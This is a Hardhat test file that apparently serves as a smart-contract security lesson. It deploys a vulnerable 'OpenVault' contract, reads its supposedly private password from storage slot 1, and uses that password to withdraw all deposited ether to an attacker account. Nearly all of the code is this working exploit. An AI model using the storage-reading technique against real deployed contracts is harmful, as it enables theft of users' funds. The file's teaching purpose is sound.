const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("OpenVault", function () {
  let deployer, attacker;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const Vault = await ethers.getContractFactory("OpenVault", deployer);
    this.vault = await Vault.deploy(
      ethers.utils.formatBytes32String("myPassword")
    );

    await this.vault.deposit({ value: ethers.utils.parseEther("100") });
  });

  it("Should be able to see the private variable", async function () {
    let getContractBalance = await ethers.provider.getBalance(
      this.vault.address
    );
    let getAttackerBalance = await ethers.provider.getBalance(attacker.address);

    console.log(
      "Contract's inital Balance",
      ethers.utils.formatEther(getContractBalance)
    );
    console.log(
      "Attacker's inital Balance",
      ethers.utils.formatEther(getAttackerBalance)
    );
    let pwd = await ethers.provider.getStorageAt(this.vault.address, 1);

    await this.vault.connect(attacker).withdraw(pwd);
    let password = ethers.utils.parseBytes32String(pwd);

    console.log("=============================");
    console.log("= password:" + password + " = ");
    console.log("=============================");

    let finalContractBalance = await ethers.provider.getBalance(
      this.vault.address
    );
    let finalAttackerBalance = await ethers.provider.getBalance(
      attacker.address
    );

    console.log(
      "Contract's final Balance",
      ethers.utils.formatEther(finalContractBalance)
    );
    console.log(
      "Attacker's final Balance",
      ethers.utils.formatEther(finalAttackerBalance)
    );

    expect(finalContractBalance).to.eq(0);
    expect(finalAttackerBalance).to.be.gt(getAttackerBalance);
  });
});
